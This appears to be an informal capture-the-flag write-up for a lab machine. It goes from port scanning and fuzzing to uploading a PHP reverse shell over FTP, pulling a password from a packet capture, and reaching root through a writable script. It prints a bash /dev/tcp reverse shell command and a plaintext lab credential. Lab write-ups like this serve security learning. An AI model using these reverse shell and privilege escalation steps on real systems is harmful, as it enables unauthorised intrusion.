IP: 10.10.12.222

After the machine started I puted the IP on web browser
and get a maintence web-page 

I will try a nmap to discovery some ports (nmap.txt)
the nmap -A -p- is tooking too long so I will start the fuzzing (first with dirb.txt, and after with gobuster.txt)
found a web-directory /files
on this dir have some files I will dowload and see what we have 
with cat command I did not get anything, I'll try to use bin-walk, it appers to be a zip file inside the jgp (stereograph.txt)

found a name on notice.txt
I will try to login on ftp
downlaoded .test.log, notice.txt, important.jpg

well, the machine have a upload direcotory /file wich is connected with ftp
so I will try to upload a reverse shell (rshell.php) and see if it will be executed on server
I got a reverse shell
so I found a dir with a wireshark file wich contains actions of a another hacker, 
in this file (suspicious.pcapng) was found a password, and I tried this password with lennie and root

lennie:c4ntg3t3n0ughsp1c3

he can not use sudo, I will find some way to priv esc to root 
on lennie directory have a sripts direcotory in planner.sh have a function that call a 
file wich I can read and write, so I will put a revershel shell code on the file and execute de planner.sh
I used Pentest/Revshells/bash-revshell to do a reverse shell 

"/bin/bash -i >& /dev/tcp/IP/PORT/ 0>&1"
 
I got root, but I will try to priv esc with a kernel exploit (just for learn)
